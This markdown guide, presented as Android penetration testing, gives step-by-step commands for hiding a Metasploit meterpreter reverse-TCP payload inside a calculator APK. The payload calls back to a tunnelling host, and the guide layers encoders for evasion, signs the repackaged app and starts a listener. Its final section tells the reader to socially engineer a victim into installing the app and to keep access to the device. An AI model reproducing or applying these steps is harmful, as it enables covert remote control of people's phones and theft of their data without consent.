# Android Penetration Testing Process Using Metasploit Framework

## **Here I use localtonet for port forwarding **

### 1. Payload Creation
```bash
msfvenom -x calculator.apk --arch dalvik --platform android \
-p android/meterpreter/reverse_tcp \
LHOST=3grblt7ju.localto.net LPORT=5730 \
-e x86/shikata_ga_nai -e x86/countdown -i 1000 -o mod.apk
```
- Creates a malicious APK with meterpreter reverse TCP payload
- Uses calculator.apk as template
- Applies multiple encodings for evasion
- Outputs to mod.apk

### 2. Keystore Generation
```bash
keytool -genkey -v -keystore my-release-key.keystore \
-alias my-key-alias -keyalg RSA -keysize 2048 -validity 10000
```
- Creates signing key for APK
- RSA algorithm with 2048-bit key
- Valid for 10,000 days

### 3. APK Optimization and Signing
```bash
zipalign -v 4 mod.apk mod-aligned.apk
apksigner sign --ks my-release-key.keystore \
--ks-key-alias my-key-alias --ks-pass pass:774789 \
--v3-signing-enabled true --v4-signing-enabled true \
--out mod-signed.apk mod-aligned.apk
```
- Aligns APK for better performance
- Signs APK with V3/V4 signing schemes
- Uses password-protected keystore

### 4. Verification
```bash
apksigner verify --verbose --print-certs mod-signed.apk
```
- Verifies APK signature
- Prints certificate information

## APK Modification (Optional)

### 5. Decompilation
```bash
apktool d mod-signed.apk -o decompiled_apk
```
- Decompiles APK for modification
- Output to decompiled_apk directory

### 6. Rebuilding
```bash
apktool b decompiled_apk -o final.apk
apksigner sign --ks my-release-key.keystore \
--ks-key-alias my-key-alias --ks-pass pass:774789 \
--v3-signing-enabled true --v4-signing-enabled true \
--out final-signed.apk final.apk
```
- Rebuilds modified APK
- Re-signs the APK

## Listener Setup

### 7. Metasploit Configuration
```bash
msfconsole -q
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
run
```
- Starts Metasploit in quiet mode
- Configures multi/handler exploit
- Sets reverse TCP payload for Android
- Listens on all interfaces (0.0.0.0) port 4444

## Execution Flow
- Distribute the `final-signed.apk` to target device
- Social engineer victim to install and run the APK
- Metasploit handler will establish meterpreter session
- Maintain access to target Android device
